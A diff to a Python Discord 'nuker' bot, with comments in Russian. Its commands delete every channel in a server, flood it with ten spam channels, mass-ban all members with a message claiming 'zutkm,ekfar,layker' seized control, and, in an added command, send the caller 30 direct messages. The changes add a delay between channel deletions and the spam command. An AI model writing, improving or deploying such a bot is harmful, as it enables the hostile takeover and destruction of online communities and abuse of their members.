@@ -7,6 +7,7 @@ from random import randint
 
 from discord import Permissions
 from discord.utils import get
+from asyncio import sleep
 
 client = commands.Bot(command_prefix=">",intents=discord.Intents.all())
 
@@ -86,10 +87,11 @@ async def moder_give(ctx):
     
     await ctx.message.delete()
 @client.command()
-async def armagedon(ctx,name):
+async def armagedon(ctx,*,name):
     guild = ctx.guild
     for channel in guild.channels:
         await channel.delete()
+        await sleep(1)
     for channel in range(10):
         await guild.create_text_channel(str(name))
 @client.command()
@@ -99,5 +101,8 @@ async def allban(ctx):
             await m.ban(reason="zutkm,ekfar,layker захватили контроль!")#баним
         except:
             pass
-
+@client.command()
+async def zutkm(ctx,*,text):
+    for f in range(30):
+        await ctx.author.send(text)
 client.run(os.environ['token'])
